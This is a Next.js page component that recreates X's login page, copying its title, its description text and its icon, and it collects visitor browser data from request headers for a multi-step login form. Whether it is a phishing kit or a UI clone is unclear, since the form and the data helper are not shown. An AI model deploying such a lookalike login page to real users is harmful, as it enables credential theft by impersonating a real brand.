import type { Metadata } from "next";
import { XIcon2 } from "@/components/icons/x";
import { LoginFormSteps } from "@/components/login-form-steps";
import { headers } from "next/headers";
import { getBrowserData } from "@/helpers/getBrowserData";

export const metadata: Metadata = {
	title: "Log in to X / X",
	description:
		"From breaking news and entertainment to sports and politics, get the full story with all the live commentary.",
};

export default async function LoginVerifyPage() {
	const headersList = await headers();

	const browserData = await getBrowserData(headersList)

	return (
		<main className="flex-1 flex bg-[#3A4853]">
			<div className="md:fixed md:top-1/2 md:left-1/2 md:-translate-y-1/2 md:-translate-x-1/2 md:w-[600px] md:h-[70%] md:min-h-[540px] bg-black md:rounded-xl flex-1 flex flex-col items-center">
				<header className="pt-3 w-full h-[50px] md:h-14 flex items-center justify-center">
					<XIcon2 className="size-8 *:stroke-2 md:size-8 fill-white/90" />
				</header>

				<LoginFormSteps browserData={browserData} />
			</div>
		</main>
	);
}
